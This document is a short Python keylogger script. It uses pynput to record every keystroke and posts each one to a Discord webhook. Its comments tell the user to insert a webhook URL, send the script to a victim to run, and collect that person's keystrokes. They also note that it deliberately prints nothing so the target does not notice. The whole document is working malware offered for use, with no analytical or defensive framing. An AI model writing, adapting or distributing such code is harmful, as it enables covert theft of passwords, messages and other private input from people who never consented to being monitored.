import requests
import pynput.keyboard

# Replace the blank space with discord webhook in between
# save the script don't change anything and send the script to someone to run it 
# then you will get his keystroke registration in discord.

WEBHOOK_URL = '   '

def send_to_discord(message):
    data = {
        "content": message
    }
    try:
        response = requests.post(WEBHOOK_URL, json=data)
        if response.status_code == 204:
            print("") #there is nothing bc u dont want to show is capturing keystrokes to target
        else:
            print(f"Failed to send message. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending message: {e}")

def on_press(key):
    try:
        key_char = key.char
    except AttributeError:
        key_char = str(key)
    send_to_discord(f"Key pressed: {key_char}")

def start_logging():
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_logging()
